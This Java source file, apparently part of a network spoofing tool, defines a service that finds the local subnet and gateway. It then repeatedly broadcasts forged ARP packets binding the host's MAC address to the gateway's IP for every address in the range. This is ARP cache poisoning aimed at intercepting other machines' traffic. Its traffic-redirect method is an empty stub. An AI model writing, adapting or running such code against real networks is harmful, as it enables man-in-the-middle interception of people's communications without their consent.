package org.bitducks.spoofing.services;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.customrules.DestinationIpRule;
import org.bitducks.spoofing.packet.PacketFactory;
import org.bitducks.spoofing.scan.IpRangeIterator;
import org.bitducks.spoofing.util.IpUtil;
import org.bitducks.spoofing.util.gateway.GatewayFinder;

public class BroadcastARPService extends Service {
	NetworkInterface servInterface;
	IpRangeIterator iterator;
	InetAddress gateway;
	
	public BroadcastARPService() {
		servInterface = Server.getInstance().getNetworkInterface();
		InetAddress firstIp = IpUtil.network(servInterface.addresses[0]);
		InetAddress lastIp = IpUtil.lastIpInNetwork(servInterface.addresses[0]);
		iterator = new IpRangeIterator(firstIp, lastIp);
		try {
			gateway = GatewayFinder.find(servInterface);
			//TODO: À REVOIR
			this.getPolicy().addRule(new DestinationIpRule(gateway));
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void run() {
		while(! this.isCloseRequested()){
			spoofedPackage();
			redirectTraffic();
			
			//Waiting 500ms to be sure we don't use all the CPU
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	private void spoofedPackage() {
		ARPPacket spoofedPacket = PacketFactory.arpRequest(servInterface.mac_address, gateway, getNextIp());
		System.out.println(spoofedPacket.toString());
		Server.getInstance().sendPacket(spoofedPacket);
	}
	
	private InetAddress getNextIp() {
		if(! iterator.hasNext()) {
			iterator.reset();
		}
		return iterator.next();
	}
	
	private void redirectTraffic() {
		System.out.println();
	}
}
